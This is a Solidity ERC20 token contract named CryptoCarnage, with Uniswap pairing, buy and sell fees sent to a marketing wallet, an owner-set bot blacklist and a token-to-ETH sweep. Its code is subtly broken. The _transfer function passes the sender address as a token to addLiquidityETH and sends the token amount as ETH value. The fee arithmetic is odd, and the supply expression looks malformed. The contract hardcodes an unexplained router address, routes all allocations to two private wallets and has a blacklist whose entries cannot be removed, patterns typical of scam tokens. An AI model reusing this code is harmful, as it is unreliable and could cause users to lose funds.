// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ReentrancyGuard.sol";
import "./Uniswap.sol";
import "./CCNERC20.sol";

contract CryptoCarnage is CCNERC20, ReentrancyGuard {
    using SafeMath for uint256;

    mapping(address => bool) bots;
    uint256 public maxSupply = 1000000000 * 10*  10**18;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool public antiBotEnabled;
    uint256 public antiBotDuration = 10 minutes;
    uint256 public antiBotTime;
    uint256 public antiBotAmount;
    
    address private team = 0xf9971Bed975Cc7679870a0C2dcA057939aC9D283;
    address private presale = 0xdA4B161470A163F58D2F678E85EbFda4F7d24662;
    address private staking = 0xf9971Bed975Cc7679870a0C2dcA057939aC9D283;
    address private marketing = 0xdA4B161470A163F58D2F678E85EbFda4F7d24662;
    address private liquidity = 0xf9971Bed975Cc7679870a0C2dcA057939aC9D283;
    address private gamePlay  = 0xf9971Bed975Cc7679870a0C2dcA057939aC9D283;
    
    constructor(string memory name, string memory symbol)
        CCNERC20(name, symbol)
    {
         uint256 totalDistribution = (amountPlayToEarn.add(teamFunds).add(presaleFunds).add(stakingFunds).add(marketingFunds)).mul(maxSupply).div(100);
        _mint(_msgSender(), maxSupply.sub(totalDistribution));
        _mint(team, maxSupply.mul(teamFunds).div(100));
        _mint(gamePlay, maxSupply.mul(amountPlayToEarn).div(100));
        _mint(presale, maxSupply.mul(presaleFunds).div(100));
        _mint(staking, maxSupply.mul(stakingFunds).div(100));
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0xF7daEef74d0848637A847f5f832b88A5A26A2069
        );

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }

    function setBots(address _bots) external onlyOwner {
        require(!bots[_bots]);

        bots[_bots] = true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        if (
            antiBotTime > block.timestamp &&
            amount > antiBotAmount &&
            bots[sender]
        ) {
            revert("Anti Bot");
        }

        uint256 transferFeeRate = recipient == uniswapV2Pair
            ? sellFeeRate
            : (sender == uniswapV2Pair ? buyFeeRate : 0);

        if (
            transferFeeRate > 0 &&
            sender != address(this) &&
            recipient != address(this)
        ) {
            uint256 _fee = amount.mul(transferFeeRate).div(100);
            super._transfer(sender, marketing, _fee.mul(3).div(100)); // TransferFee
            amount = amount.sub(_fee);
            uniswapV2Router.addLiquidityETH{value: amount}(
                sender,
                _fee.mul(3).div(100),
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                liquidity,
                block.timestamp
            );
        }

        super._transfer(sender, recipient, amount);
    }
    
    

    function sweepTokenForBosses() public nonReentrant {
        uint256 contractTokenBalance = balanceOf(address(this));
        if (contractTokenBalance >= tokenForBosses) {
            swapTokensForEth(tokenForBosses);
        }
    }

    // receive eth from uniswap swap
    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            addressForBosses, // The contract
            block.timestamp
        );
    }

    function setAddressForBosses(address _addressForBosses) external onlyOwner {
        require(_addressForBosses != address(0), "0x is not accepted here");

        addressForBosses = _addressForBosses;
    }

    function antiBot(uint256 amount) external onlyOwner {
        require(amount > 0, "not accept 0 value");
        require(!antiBotEnabled);

        antiBotAmount = amount;
        antiBotTime = block.timestamp.add(antiBotDuration);
        antiBotEnabled = true;
    }
}